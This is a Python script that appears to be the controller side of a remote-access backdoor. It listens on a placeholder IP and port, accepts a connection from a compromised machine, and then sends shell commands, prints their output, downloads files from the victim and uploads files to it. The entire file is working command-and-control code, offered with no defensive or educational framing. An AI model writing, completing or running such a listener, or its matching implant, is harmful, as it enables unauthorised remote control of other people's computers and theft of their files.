#!/usr/bin/env python
import binascii
import socket
import json
import tqdm


class Listener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("YOUR IP", 8080))
        listener.listen(0)
        print("[+] Waiting for connections")
        self.connection, self.address = listener.accept()
        print("[+] STH connected from " + str(self.address))

    def complete_send(self, data):
        json_file = json.dumps(data)
        self.connection.send(json_file.encode())

    def complete_receive(self):
        json_file = ""
        while True:
            try:
                try:
                    json_file = json_file + self.connection.recv(1024).decode()
                except:
                    json_file = json_file + self.connection.recv(1024).decode("ISO-8859-1")
                return json.loads(json_file)
            except ValueError:
                continue

    def upload_file(self, name):
        content = b""
        with open(name, "rb") as file:
            content += file.read()
        self.connection.sendall(content + b"<END>")

    def download_file(self, name):
        try:
            file_size = int(self.connection.recv(1024))
            progress_bar = tqdm.tqdm(unit="B", unit_scale=True, unit_divisor=1000, total=file_size)
        except:
            file_size = None
        content = b""
        while True:
            content += self.connection.recv(2048)
            if file_size is not None:
                progress_bar.update(2048)
            if content[-5:] == b"<END>":
                break
        with open(name, "wb") as out_file:
            out_file.write(content.removesuffix(b"<END>"))

    def start(self):
        global result
        while True:
            cmd = str(input(">>> "))
            cmd = cmd.split(" ")
            self.complete_send(cmd)
            if cmd[0] == "download":
                self.download_file(cmd[1])
                print("\n[+] File was downloaded successfully\n")
            elif cmd[0] == "upload":
                self.upload_file(cmd[1])
                result = self.complete_receive()
                print(result)
            else:
                result = self.complete_receive()
                if cmd[0] == "exit":
                    print(result)
                    self.connection.close()
                    exit()
                else:
                    print("\n" + result)
